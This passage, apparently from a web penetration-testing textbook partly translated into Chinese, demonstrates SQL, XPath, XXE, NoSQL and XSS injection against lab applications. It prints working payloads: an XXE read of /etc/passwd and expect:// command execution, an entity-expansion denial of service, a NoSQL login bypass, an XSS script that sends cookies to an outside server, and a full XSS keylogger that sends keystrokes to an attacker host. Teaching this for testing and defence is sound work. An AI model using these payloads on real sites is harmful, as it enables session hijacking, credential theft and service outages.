  \ have the same size (1470 B)\nfiles saved to [1]:\n[*] /root/.sqlmap/output/10.7.7.5/files/_etc_passwd\
  \ (same file)\n[01:28:25] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.7.7.5'\n\
  [*] shutting down at 01:28:25\nroot@kali:~# WebPentest# cat /root/.sqlmap/output/10.7.7.5/files/_etc_passwd\n\
  root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/sh\n\
  sys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\n\
  \nsqlmap 工具提供的一些额外选项如下表所示：\n\n| Option | Description |\n|---|---|\n| -f | This performs\
  \ an extensive fingerprint of the database |\n| -b | This retrieves the DBMS banner\
  \ |\n| --sql-shell | This accesses the SQL shell prompt after successful exploitation\
  \ |\n| --schema | This enumerates the database schema |\n| --comments | This searches\
  \ for comments in the database |\n| --reg-read | This reads a Windows registry key\
  \ value |\n| --identify-waf | This identifies WAF/IPS protection |\n| --level N\
  \ | This sets the scan level (amount and complexity of injected variants) to N (1-5)\
  \ |\n| --risk N | This sets the risk of requests (1-3); Level 2 includes heavy time-based\
  \ requests; Level 3 includes OR-based requests |\n| --os-shell | This attempts to\
  \ return a system shell |\n\nsqlmap 可使用的所有选项的详尽列表可以在此 GitHub 项目页面找到， https://github.com/sqlmapproject/sqlmap/wiki/Usage。\n\
  \n## Attack potential of the SQL injection flaw\n\nThe following are techniques\
  \ used to manipulate the SQL injection flaw:\n\n- By altering the SQL query, the\
  \ attacker can retrieve extra data from the database that a normal user is not authorized\
  \ to access\n- Run a DoS attack by deleting critical data from the database\n- Bypass\
  \ authentication and perform privilege escalation attacks\n- Using batched queries,\
  \ multiple SQL operations can be executed in a single request\n- Advance SQL commands\
  \ can be used to enumerate the schema of the database and then alter the structure\
  \ too\n- Use the load_file() function to read and write files on the database server\
  \ and the into outfile() function to write files\n- Databases such as Microsoft\
  \ SQL allow OS commands to run through SQL statements using xp_cmdshell; an application\
  \ vulnerable to SQL injection can allow the attacker to gain complete control over\
  \ the database server and also attack other devices on the network through it\n\n\
  ## XML injection\n\nThis section will cover two different perspectives on the use\
  \ of XML in web applications:\n\n- When the application performs searches in an\
  \ XML file or XML database\n- When the user submits XML formatted information to\
  \ be parsed by the application\n\n## XPath injection\n\nXPath is a query language\
  \ for selecting nodes from an XML document. The following is the basic XML structure:\n\
  \n```\n<rootNode>\n```\n\n```\n<childNode>\n  <element/>\n</childNode>\n</rootNode>\n\
  ```\n\nAn XPath search for **element** can be represented as follows:\n\n```\n/rootNode/childNode/element\n\
  ```\n\nMore complex expressions can be made, for example, an XPath query for a login\
  \ page may look like the following:\n\n```\n//Employee[UserName/text()='myuser'\
  \ And Password/text()='mypassword']\n```\n\nAs with SQL, if the input from the user\
  \ is taken as is and concatenated to a query string, such input may be interpreted\
  \ as code instead of data parameters.\n\nFor example, let's look at bWapp's **XML/XPath\
  \ Injection (Search)** exercise. It shows a drop box, where you can choose a genre\
  \ and search for movies that match this genre:\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_239_0.png)\n\
  \nHere, *genre* is an input parameter for some search that the application does\
  \ on the server side. To test it, you will need to create a search while having\
  \ the browser first identify the request that sends the *genre* parameter to the\
  \ server (/bWAPP/xmli_2.php?genre=action&action=search), and then send it to Repeater.\
  \ You will do this using a proxy such as Burp Suite or ZAP. Once in Repeater, add\
  \ a single quote to the genre. Then, click on **Go** and analyze the response:\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_240_0.png)\n\nBy adding a single quote,\
  \ we caused a syntax error in the application shown in the response. It clearly\
  \ indicates that XPath is being used. Now you need to know how the query is constructed.\
  \ For starters, let's see whether it looks for the whole text or part of it. Remove\
  \ the last letters of the genre and click on **Go**:\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_241_0.png)\n\
  \nYou can see that if you use only a part of the genre, you still get the same results\
  \ as when using the complete word. This means that the query is using the contains()\
  \ function. You can look at the source code in https://github.com/redmondmj/bWAPP,\
  \ as it is an open source application. Let's take the black box approach, however;\
  \ so, it may be something like the following:\n\n```\n.../node[contains(genre, '$genre_input')]/node...\n\
  ```\n\nThough you may not know the full query, you can have a high level of confidence\
  \ that [contains(genre, '$genre_input')] or something very similar is in place.\n\
  \nNow try a more elaborate injection that attempts to retrieve all of the records\
  \ in the XML file that you inject:\n\n```\n'')]/*/*/ [contains('1','1\n```\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_242_0.png)\n\
  \nYou can see that the response contains much more information than the original\
  \ query, and the application will not show some of this information as part of a\
  \ normal search.\n\n## XPath injection with XCat\n\nXCat is a tool written in Python\
  \ 3, which can help you retrieve information using XPath injection vulnerabilities.\
  \ It is not included by default in Kali Linux, but it can easily be added. You need\
  \ to have Python 3 and pip installed in Kali Linux, and then just run the following\
  \ in Terminal:\n\n```\napt-get install python3-pip\npip3 install xcat\n```\n\nOnce\
  \ XCat is installed, you need to be authenticated in bWAPP to get the vulnerable\
  \ URL and cookie, so you can issue a command with the following structure:\n\n```\n\
  xcat -m <http_method> -c \"<cookie value>\" <URL_without_parameters> <injectable_parameter>\
  \ <parameter1=value> <parameter2=value> -t \"<text_in_true_results>\"\n```\n\nIn\
  \ this case, the command would be as follows:\n\n```\nxcat -m GET -c\n\"PHPSESSID=kbh3orjn6b2gpimethf0ucq241;JSESSIONID=9D7765D7D1F2A9FCCC5D972A043F9867;security_level=0\"\
  \ http://10.7.7.5/bWAPP/xmli_2.php genre genre=horror action=search -t \">1<\"\n\
  ```\n\nNotice that we use \">1<\" as the true string. This is because the number\
  \ in the results table only appear when at least one result is found. Running that\
  \ command against bWAPP will result in something like the following:\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_243_0.png)\n\
  \n## The XML External Entity injection\n\nIn XML, an **entity** is a storage unit\
  \ that can be internal or external. An internal entity is one that has its value\
  \ defined in its declaration, and an external entity takes the value from an external\
  \ resource, such as a file. When an application receives some input from the user\
  \ in XML format and processes external entities declared within it, it is vulnerable\
  \ to the **XML External Entity (XXE)** injection.\n\nWe'll use bWAPP again to put\
  \ this into practice using the XEE exercise in **/A7 - Missing Functional Level\
  \ Access Control/**. There you will see only text with a button, and nothing seems\
  \ to happen when you click on it. Let's check the proxy's recorded requests, however:\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_244_0.png)\n\n\n\n\n\n因此，这里你发送的 XML 结构包含你的用户名和一些密钥。你将请求发送到\
  \ Repeater 以进一步分析并进行测试。首先，尝试创建一个内部实体，看看服务器是否会处理它。为此，提交以下 XML：\n\n```\n<!DOCTYPE\
  \ test [ <!ENTITY internal-entity \"boss\" >]>\n<reset><login>&internal-entity;</login><secret>Any\
  \ bugs?</secret></reset>\n```\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_245_0.png)\n\
  \n在这里我们创建了一个名为 internal-entity 的实体，其值为 \"boss\"，然后我们使用该实体替换 login 值，该值在响应中被反射。这意味着通过该实体加载的任何内容都将被服务器处理并反射。\n\
  \n尝试按如下方式加载文件：\n\n```\n<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"\
  \ >]>\n```\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_246_0.png)\n\n使用 SYSTEM，你正在定义一个外部实体。这会加载一个文件\
  \ (/etc/passwd)，并且服务器会在其响应中显示结果。\n\n如果解析器未正确配置，并且加载了 expect PHP 模块，你也可以通过 XXE 获得远程执行：\n\
  \n```\n<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"expect://uname -a\" >]>\n```\n\n##\
  \ 实体扩展攻击\n\n即使解析器不允许外部实体，内部实体的允许仍然可以被恶意用户利用并导致服务器中断。因为所有 XML 解析器都会用其定义的值替换实体，所以可以创建一个递归实体集，使得服务器在无法响应之前处理大量信息。\n\
  \n这被称为 **实体扩展攻击**。以下结构是一个简单的概念验证：\n\n```\n<!DOCTYPE test [\n<!ENTITY entity0 \"\
  Level0-\">\n<!ENTITY entity1 \"Level1-&entity0;\">\n<!ENTITY entity2 \"Level2-&entity1;&entity1;\"\
  >\n<!ENTITY entity3 \"Level3-&entity2;&entity2;&entity2;\">\n<!ENTITY entity4 \"\
  Level4-&entity3;&entity3;&entity3;&entity3;\">\n<!ENTITY entity5 \"Level5-\n&entity4;&entity4;&entity4;&entity4;&entity4;\"\
  >\n]>\n<reset><login>&entity0;</login><secret>Any bugs?</secret></reset>\n```\n\n\
  ![](img/6b6e557533100c0e47951d0e5e14c4ee_247_0.png)\n\n在这里，你可以看到加载 `entity5` 时会发生什么。所有其他实体也将被加载。此信息在处理时存储在服务器的内存中，因此如果你发送足够大的有效负载或足够深的递归，你可能会导致服务器内存耗尽，无法响应用户的请求。\n\
  \n现在让我们看看加载 entity5 时响应大小的变化：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_248_0.png)\n\
  \n必须记住，在对真实应用程序进行渗透测试时，这类测试必须极其谨慎地进行，并且仅进行到能够证明漏洞存在而不影响服务的程度，除非客户另有说明。在这种情况下，应采取特殊环境和特殊的日志记录和监控措施。对于实体扩展攻击，展示六或七级的递归作为概念验证就足够了。响应时间也应予以考虑。\n\
  \n## NoSQL 注入\n\n近年来，大数据，或在各种规模的公司中对各种版本和各种目的的海量信息的存储、处理和分析的推广和实施日益增加。这类信息通常是非结构化的或来源于不一定兼容的来源。因此，需要将其存储在某种特殊的数据库中，即所谓的不仅仅是\
  \ SQL（NoSQL）数据库，例如 MongoDB、CouchDB、Cassandra 和 HBase。\n\n上述数据库管理器不使用 SQL（或不完全使用\
  \ SQL）这一事实并不意味着它们免受注入风险。请记住，SQL 注入漏洞是由发送查询的应用程序缺乏验证造成的，而不是由 DBMS 处理它造成的。对 NoSQL\
  \ 数据库查询进行代码注入或更改参数是可能的，并且并不罕见。\n\n## 测试 NoSQL 注入\n\nNoSQL 查询通常以 JSON 格式完成。例如，MongoDB\
  \ 中的查询可能如下所示：\n\n```\nUser.find({ username: req.body.username, password: req.body.password\
  \ }, ...\n```\n\n要在使用 MongoDB 数据库的应用程序中注入代码，你需要利用 JSON 语法使用 ' \" ; { } 等字符并形成有效的\
  \ JSON 结构。\n\n## 利用 NoSQL 注入\n\n为了测试实际利用是如何工作的，你可以使用 Snyk 制作的易受攻击的应用程序（https://github.com/snyk/goof）。要运行此应用程序，你需要在目标服务器上安装并正确运行\
  \ Node.js 和 MongoDB。\n\n你应该尝试绕过管理员部分密码检查的注入攻击。设置代理后，浏览到易受攻击应用程序的管理员部分。在此示例中，它将是\
  \ http://10.0.2.2:3001/admin。如果你提交用户 admin 和任何密码，你会看到没有访问权限。\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_249_0.png)\n\
  \n如果你将该请求发送到 Repeater，你可以看到它发送了两个参数：username 和 password。你应该将请求格式更改为 JSON。为此，你更改\
  \ Content-Type 头的值和参数的格式：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_250_0.png)\n\
  \n如果你提交该请求，服务器似乎接受了它，因为没有生成错误。为了清晰起见，让我们以 JSON 格式使用实际的管理员密码，以确保它确实被接受：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_250_1.png)\n\
  \n现在你知道它有效了，尝试注入一个条件而不是密码值，以便验证始终为真。查询将说，“如果用户名是 admin 且密码大于一个空字符串”：\n\n```\n{\"\
  username\":\"admin\",\"password\":{\"$gt\":\"\"}}\n```\n\n$gt 是 MongoDB 的一个特殊查询运算符，表示大于\
  \ (>) 二进制操作。更多运算符和注入字符串可以在 https://github.com/cr0hn/nosqlinjection_wordlists 找到。\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_251_0.png)\n\nNoSQLMap（https://github.com/codingo/NoSQLMap.git）是一个开源工具，未包含在\
  \ Kali Linux 中，但易于安装。它可用于自动化 NoSQL 注入检测和利用。\n\n## 注入漏洞的缓解和预防\n\n防止注入漏洞的关键方面是验证。用户提供输入绝不能被信任，并且应始终进行验证，并在包含无效或危险字符时被拒绝或清理，例如以下内容：\n\
  \n- 引号 (' 和 \")\n- 括号和方括号\n- 保留特殊字符 ('!', '%', '&', 和 ';')\n- 注释组合 ('--', '/*',\
  \ '*/', '#', 和 '(:', ' :)')\n- 其他特定于语言和实现的字符\n\n验证的推荐方法是白名单。这意味着为每个输入字段或字段组列出允许的字符，并将提交的字符串与该列表进行比较。提交字符串中的所有字符都必须在允许列表中才能通过验证。\n\
  \n对于 SQL 注入预防，应使用参数化或预准备语句，而不是将输入连接到查询字符串。预准备语句的实现因语言而异，但它们都遵循相同的原则；客户端提供的输入不会连接到查询字符串，而是作为参数发送给一个函数，该函数正确构建查询。以下是\
  \ PHP 的示例：\n\n```\n$stmt = $dbh->prepare(\"SELECT * FROM REGISTRY where name LIKE\
  \ '%?%'\");\n$stmt->execute(array($_GET['name']));\n```\n\n有关此主题的一些有用参考如下：\n\n-\
  \ https://www.owasp.org/index.php/Data_Validation\n- https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet\n\
  - https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet\n\
  \n\n\n\n\n## 6"
- "## 查找和利用跨站脚本（XSS）漏洞\n\nWeb 浏览器是一种代码解释器，它接收 HTML 和脚本代码，以有吸引力且有用的格式向用户呈现文档，包括文本、图像和视频剪辑。它允许用户与动态元素交互，包括搜索字段、超链接、表单、视频和音频控件等。\n\
  \n应用程序管理与用户这种动态交互的方式有很多种。在当今的 Web 应用程序中最常见的一种方式是使用客户端脚本代码。这意味着服务器向客户端发送代码，由 Web\
  \ 浏览器执行。\n\n当用户输入用于确定脚本代码行为，并且该输入未经过适当的验证和清理以防止其包含代码而非信息时，被注入的代码将被浏览器执行，你就会出现跨站脚本（XSS）漏洞。\n\
  \nXSS 是一种代码注入，当脚本代码被添加到用户输入中并被 Web 浏览器作为代码而不是数据处理时就会发生，随后浏览器执行它，从而改变用户看到的页面和/或其功能。\n\
  \n## 跨站脚本概述\n\n名称“跨站脚本”可能与当前定义没有直观联系。这是因为该术语最初指的是一个相关但不同的攻击。在 1990 年代末和 2000 年代初，可以使用\
  \ JavaScript 代码从相邻窗口或框架中加载的网页读取数据。因此，恶意网站可以跨越边界与加载在与其域名完全无关的另一个网页上的内容交互。这后来被浏览器开发人员修复了，但攻击名称被继承给了使网页在浏览器中加载和执行恶意脚本而不是从相邻框架读取内容的技巧。\n\
  \n简单来说，XSS 攻击允许攻击者在另一用户的浏览器中执行恶意脚本代码。它可以是 JavaScript、VBScript 或任何其他脚本代码，尽管 JavaScript\
  \ 是使用最广泛的一种。恶意脚本通过易受 XSS 攻击的网站传递给客户端。在客户端，Web 浏览器将脚本视为网站的合法部分并执行它们。当脚本在受害者浏览器中运行时，它可以强制浏览器执行类似于用户可以执行的操作。脚本还可以使浏览器执行欺诈交易、窃取\
  \ cookie 或将浏览器重定向到另一个网站。\n\n一次 XSS 攻击通常涉及以下参与者：\n\n- 执行攻击的攻击者\n- 易受攻击的 Web 应用程序\n\
  - 使用 Web 浏览器的受害者\n- 攻击者想要将浏览器重定向到或通过受害者攻击的第三方网站\n\n让我们看一个攻击者执行 XSS 攻击的例子：\n\n- 1.\
  \ 攻击者首先使用合法数据测试各种输入字段是否存在 XSS 漏洞。会将数据反射回浏览器的输入字段可能是 XSS 漏洞的候选。以下屏幕截图显示了一个示例，其中网站使用\
  \ GET 方法传递输入并将其显示回浏览器：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_255_0.png)\n\n\
  2. 一旦攻击者找到一个参数注入点，该参数未进行充分或未进行输入验证，他们就必须想办法将包含 JavaScript 的恶意 URL 传递给受害者。攻击者可以使用电子邮件作为传递机制，或通过网络钓鱼攻击诱使受害者查看电子邮件。\n\
  \n3. 电子邮件将包含指向易受攻击的 Web 应用程序的 URL 以及注入的 JavaScript。当受害者点击它时，浏览器会解析 URL 并将 JavaScript\
  \ 也发送到网站。输入以 JavaScript 的形式被反射到浏览器中；请考虑以下示例：\n\n```\n<script>alert('Pwned!!')</script>.\n\
  ```\n\n完整的 URL 是 http://example.org/hello.php?name=<script>alert('Pwned!!')</script>.\n\
  \n4. alert 方法通常用于演示目的并测试应用程序是否易受攻击。我们将在本章后面探讨攻击者经常使用的其他 JavaScript 方法。\n\n5. 如果\
  \ Web 应用程序易受攻击，对话框将会在受害者的浏览器中弹出，如以下屏幕截图所示：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_256_0.png)\n\
  \nXSS 的主要目标是在受害者的浏览器中执行 JavaScript，但实现方式取决于网站的设计和目的。以下是 XSS 的三大主要类别：\n\n- 持久型 XSS\n\
  - 反射型 XSS\n- 基于 DOM 的 XSS\n\n### 持久型 XSS\n\n当注入的数据存储在 Web 服务器或数据库中，并且应用程序在未经验证的情况下将其提供回一个或所有用户时，XSS\
  \ 漏洞被称为持久型或存储型。攻击者如果目标是感染网站的每个访客，就会使用持久型 XSS 攻击。这使攻击者能够大规模利用网站。\n\n持久型 XSS 漏洞的典型目标如下：\n\
  \n- 基于 Web 的讨论论坛\n- 社交网络网站\n- 新闻网站\n\n**持久型 XSS** 被认为比其他 XSS 漏洞更严重，因为攻击者的恶意脚本会自动注入到受害者的浏览器中。它不需要网络钓鱼攻击来诱使用户点击链接。攻击者将恶意脚本上传到易受攻击的网站，然后在用户正常浏览活动期间将其作为其浏览活动的一部分传递给受害者浏览器。由于\
  \ XSS 还可用于从外部站点加载脚本。这在存储型 XSS 中尤其具有破坏性。当注入时，以下代码将查询远程服务器以获取要执行的 JavaScript：\n\n\
  ```\n<script type=\"text/javascript\"\nsrc=\"http://evil.store/malicious.js\"></script>\n\
  ```\n\n易受持久型 XSS 攻击的 Web 应用程序示例如下图所示。该应用程序是一个在线论坛，用户可以在其中创建账户并与其他人互动。应用程序将用户资料存储在数据库中以及其他详细信息中。攻击者确定应用程序未能清理评论部分中保存的数据，并利用这一机会向该字段添加恶意\
  \ JavaScript。该 JavaScript 被存储在 Web 应用程序的数据库中。在正常浏览期间，当无辜的受害者查看这些评论时，JavaScript 会在受害者的浏览器中执行，然后抓取\
  \ cookie 并将其发送到攻击者控制的远程服务器：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_257_0.png)\n\
  \n最近，持久型 XSS 已被用于互联网上的多个站点，以利用用户的网站作为加密货币挖矿的工作者或形成浏览器僵尸网络。\n\n### 反射型 XSS\n\n**反射型\
  \ XSS** 是一种非持久型攻击形式。恶意脚本是受害者向 Web 应用程序发出的请求的一部分，随后应用程序以响应的形式将其反射回来。这看起来可能难以利用，因为用户不会自愿向服务器发送恶意脚本，但有几种方法可以欺骗用户对其自己的浏览器发动反射型\
  \ XSS 攻击。\n\n反射型 XSS 大多用于针对性攻击，其中黑客部署包含恶意脚本和 URL 的网络钓鱼电子邮件。或者，攻击可能涉及在公共网站上发布链接并诱使用户点击它。这些方法结合使用\
  \ URL 缩短服务来缩短 URL 并隐藏会引起受害者怀疑的冗长、奇怪的脚本，可以以较高的成功率执行反射型 XSS 攻击。\n\n如以下图所示，受害者被诱骗点击一个\
  \ URL，该 URL 将脚本传递给应用程序，应用程序随后在未经适当验证的情况下将其反射回来：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_258_0.png)\n\
  \n### 基于 DOM 的 XSS\n\n第三种 XSS 类型是本地的，直接影响受害者的浏览器。这种攻击不依赖于将恶意内容发送到服务器，而是使用 **文档对象模型（DOM）**，即浏览器用于操作和呈现网页的\
  \ API。在持久型和反射型 XSS 中，脚本由服务器包含在响应中。受害者的浏览器接受它，假定它是网页的合法部分，并在页面加载时执行它。在 **基于 DOM 的\
  \ XSS** 中，只有服务器提供的合法脚本才会被执行。\n\n\n\n\n\n越来越多的 HTML 页面并非由服务器按应展示的方式发送，而是通过在客户端下载\
  \ JavaScript 并使用配置参数来调整用户所见内容的方式生成。只要页面中的某个元素需要在不刷新整个页面的情况下被更改，就会使用 JavaScript 来完成。一个典型的例子是允许用户更改页面语言或颜色，或调整其中元素的大小的网站。\n\
  \nDOM-based XSS 利用这种合法的客户端代码来执行脚本攻击。DOM-based XSS 最重要的一点是，合法的脚本正在使用用户提供的输入向用户浏览器上显示的网页添加\
  \ HTML 内容。\n\n让我们讨论一个 DOM-based XSS 的示例：\n\n- 1. 假设一个网页被创建为根据 URL 中传递的城市名称显示定制内容，URL\
  \ 中的城市名称也会在用户浏览器的 HTML 网页中显示，如下所示：\n  \n      `http://www.cityguide.test/index.html?city=Mumbai`\n\
  \  \n- 2. 当浏览器接收到前述 URL 时，它向 `http://www.cityguide.test` 发送请求以接收网页。在用户浏览器上，会下载并运行合法的\
  \ JavaScript，该脚本编辑 HTML 页面，将城市名称添加到加载页面的标题顶部作为标题。城市名称取自 URL（本例中为 `Mumbai`）。因此，城市名称是用户可以控制的参数。\n\
  \  \n- 3. 如前所述，DOM-based XSS 中的恶意脚本不会发送到服务器。为实现这一点，会使用 # 号来防止该符号之后的内容被发送到服务器。因此，服务器端代码无法访问它，即使客户端代码可以访问它。\n\
  \  \n  恶意 URL 可能如下所示：\n  \n  `http://www.cityguide.test/index.html?#city=<script>function</script>`\n\
  \  \n- 4. 当页面加载时，浏览器会执行使用 URL 中的城市名称生成 HTML 内容的合法脚本。在这种情况下，合法脚本会遇到恶意脚本，并将脚本写入 HTML\
  \ 正文而不是城市名称。当网页被渲染时，脚本会被执行，从而导致 DOM-based XSS 攻击。\n\n下图说明了 DOM-based XSS：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_260_0.png)\n\
  \n## 使用 POST 方法的 XSS\n\n在之前的示例中，你已经看到了使用 GET 方法将恶意链接传递给受害者或将有效载荷存储在服务器上的用法。虽然在现实生活中攻击可能需要更复杂的设置，但使用\
  \ POST 请求的 XSS 攻击也是可能的。\n\n由于 POST 参数是在请求正文中发送而不是在 URL 中，因此使用此方法进行 XSS 攻击需要攻击者说服受害者浏览由攻击者控制的站点。这将向易受攻击的服务器发送恶意请求，服务器将因此向用户做出响应，如下图所示：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_260_1.png)\n\n## 其他 XSS 攻击向量\n\n通过 POST\
  \ 或 GET 方法发送的表单参数并不是用于 XSS 攻击的唯一参数。User-Agent、Cookie、Host 以及任何其他信息被反射回客户端的头部值也容易受到攻击，并且容易受到\
  \ XSS 攻击，甚至是通过 OPTIONS 或 TRACE 方法。作为渗透测试人员，你需要完全测试请求的所有组件，这些组件由服务器处理并反射回用户。\n\n\
  ## 利用跨站脚本\n\n黑客在利用 XSS 漏洞方面非常有创造性，并且随着当前浏览器中 JavaScript 的能力，攻击可能性已经增加。XSS 结合 JavaScript\
  \ 可用于以下类型的攻击：\n\n- 账户劫持\n- 修改内容\n- 篡改网站\n- 从受害者机器运行端口扫描\n- 记录击键并监控用户活动\n- 窃取浏览器信息\n\
  - 利用浏览器漏洞\n\n触发 XSS 漏洞的方式有很多种，不仅仅是 <script></script> 标签。请参考 OWASP 在以下链接的备忘单：\nhttps://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet\n\
  \n在以下章节中，我们将查看一些实际示例。\n\n## Cookie 窃取\n\nXSS 漏洞的一个直接影响是攻击者可能使用脚本代码窃取有效的会话 cookie，并在\
  \ cookie 参数配置不当时劫持用户的会话。\n\n为了收集会话 cookie，攻击者需要运行一个正在监听由注入应用程序发送的请求的 Web 服务器。在最基本的情况下，这可以使用从基本的\
  \ Python HTTP 服务器到运行接收和存储 ID 甚至自动执行进一步攻击的应用程序的适当 Apache 或 nginx 服务器来完成。为了演示的目的，我们将使用基本的\
  \ Python 服务器。在 Kali Linux 的终端会话中执行以下命令以在端口 8000 上运行服务器：\n\n```\npython -m SimpleHttpServer\
  \ 8000\n```\n\n服务器运行后，你将利用 OWASP BWA 虚拟机中包含的 WackoPicko Web 应用程序中的持久性 XSS。浏览 Kali\
  \ Linux 中的 WackoPicko，并在 Guestbook 表单中提交包含以下代码的评论：\n\n```\n<script>document.write('<img\
  \ src=\"http://127.0.0.1:8000/'+document.cookie+'\" />');</script>\n```\n\n请注意，127.0.0.1\
  \ 是 Kali Linux 的本地 IP 地址。它应被替换为设置用于接收 cookie 的服务器的地址：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_262_0.png)\n\
  \n每次加载 Guestbook 页面时，它都会执行脚本并尝试从外部服务器获取图像。获取此类图像的请求会在 URL 中包含会话 cookie，该 cookie\
  \ 将被记录在接收服务器上，如以下屏幕截图所示：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_263_0.png)\n\
  \n## 网站篡改\n\n使用 XSS 篡改网站（更改其视觉外观）并不是一种常见的攻击。尽管如此，它是可以做到的，尤其是在持久性漏洞的情况下，并且即使服务器文件未被更改，也可能对网站被篡改的公司造成严重的声誉损害。\n\
  \n你可以用 JavaScript 以多种方式更改网站的外观。例如，插入 HTML 元素如 div 或 iframe，替换样式值，更改图像源，以及许多其他技术都可以改变网站的外观。你也可以使用\
  \ document 的 body 的 innerHTML 属性来替换页面的整个 HTML 代码。\n\nMutillidae II 有一个 DOM XSS 测试表单，可帮助我们测试这一点。在菜单中，转到\
  \ OWASP 2013 | A3 - 跨站脚本 (XSS) | DOM 注入 | HTML5 存储。此演示应用程序将信息保存到浏览器的 HTML5 存储中，并且包含许多漏洞。在这里，我们将重点关注它在元素添加到存储时反射键的事实，如以下屏幕截图所示：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_263_1.png)\n\n表单具有一定程度的清理，因为 script 标签不会被反射：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_264_0.png)\n\n经过不同注入字符串的反复试验，你会发现带有不存在源的\
  \ img 标签（例如 src 参数）是可行的：\n\n```\n<img src=x onerror=\"document.body.innerHTML='<h1>Defaced\
  \ with XSS</h1>'\">\n```\n\n将该代码设置为新元素的键并单击 Add New 后，会显示以下内容：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_264_1.png)\n\
  \n如前所述，此类攻击不会更改 Web 服务器上的文件，并且更改仅对运行恶意脚本的用户可见。当利用持久性 XSS 时，篡改可能会影响大量用户，因为攻击者无需像反射和基于\
  \ DOM 的 XSS 那样单独针对每个受害者。无论如何，这可能导致用户在认为他们向合法网站提交信息时，将敏感信息提供给攻击者。\n\n\n\n\n\n## Key\
  \ loggers\n\n另一种利用 XSS 收集用户敏感信息的方法是将浏览器变成一个键盘记录器，捕获每个按键并将其发送到攻击者控制的服务器。这些按键可能包含用户在页面中输入的敏感信息，例如姓名、地址、密码、密保问题及答案、信用卡信息等，具体取决于易受攻击页面的用途。\n\
  \n我们将使用预装在 Kali Linux 中的 Apache Web 服务器，以便将按键存储到文件中，这样在利用 XSS 后我们就可以检查易受攻击应用程序发送的键。服务器将有两个文件：klog.php\
  \ 和 klog.js。\n\nklog.php 文件如下所示：\n\n```\n<?php\n    if(!empty($_GET['k'])) {\n \
  \       $file = fopen('keys.txt', 'a');\n        fwrite($file, $_GET['k']);\n  \
  \      fclose($file);\n    }\n?>\n```\n\nklog.js 文件如下所示：\n\n```\nvar buffer = [];\n\
  var server = 'http://10.7.7.4/klog.php?k='\ndocument.onkeypress = function(e) {\n\
  \    buffer.push(e.key);\n}\nwindow.setInterval(function() {\n    if (buffer.length\
  \ > 0) {\n        var data = encodeURIComponent(buffer);\n        new Image().src\
  \ = server + data;\n        buffer = [];\n    }\n}, 200);\n```\n\n这里，10.7.7.4 是\
  \ Kali Linux 机器的地址，这样受害者就会将缓冲区发送到该服务器。此外，根据系统配置，你可能需要在代码指定的路径中创建 keys.txt 文件。在此示例中，它是\
  \ Web 根目录 (/var/www/html/)。另外，添加写权限或将所有权设置为 Apache 的用户，以防止 Web 服务器尝试更新本地文件时出现权限错误：\n\
  \n```\ntouch /var/www/html/keys.txt\nchown www-data /var/www/html/keys.txt\n```\n\
  \n这是一个最简单的键盘记录器版本。更复杂的版本可以包括以下内容：\n\n- 捕获的时间戳\n- 发送信息的用户或机器标识符\n- 将密钥保存到数据库以便于查询、分组和排序\n\
  - 控制功能，例如启动和停止键盘记录器、在特定按键或组合时触发操作\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_266_0.png)\n\
  \n在渗透测试期间捕获客户端或用户的信息应尽可能避免，尽管有时为了正确覆盖某些攻击向量是必要的。如果是这种情况，必须在传输、存储和处理此类信息时采取适当的安全措施。如果任何信息发送到渗透测试人员控制的服务器，通信必须使用\
  \ HTTPS、SSH 或其他安全协议进行加密。存储也必须加密。推荐使用全盘加密，但在此基础上还需要数据库和文件加密。此外，根据参与规则，可能要求安全擦除所有信息。\n\
  \n再次使用 WackoPicko 的 **Guestbook**，提交以下评论：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_267_0.png)\n\
  \n这将在每次用户访问 **Guestbook** 页面时加载外部 JavaScript 文件并捕获他们发出的所有按键。你现在可以在页面中输入任何内容，它将被发送到你的服务器。\n\
  \n如果你想查看迄今为止记录的内容，只需查看 Kali Linux 中的 `keys.txt` 文件即可：\n\n```\nroot@kali:~# cat /var/www/html/keys.txt\n\
  th,is is a, t,est, of, jBackspacekeyloggi,ngv,<,><>ArrowLeft,ArrowLeftArrowLeftscriptArrowRightArrowRight,ArrowRightArrowLeft/script,tkeyl,lBackspaceo\
  \ ,src=\"ArrowLefthtt,p://,1.7.7.7Backspace4/klog.j,sHomeEndccvKeys presse,d adBackspacefter\
  \ keylogge,r\n```\n\n可以看到，按键在客户端被缓冲并定期发送，因此有长度不一的组以逗号分隔，非打印键则以名称写入：ArrowLeft、ArrowRight、Backspace、Home、End\
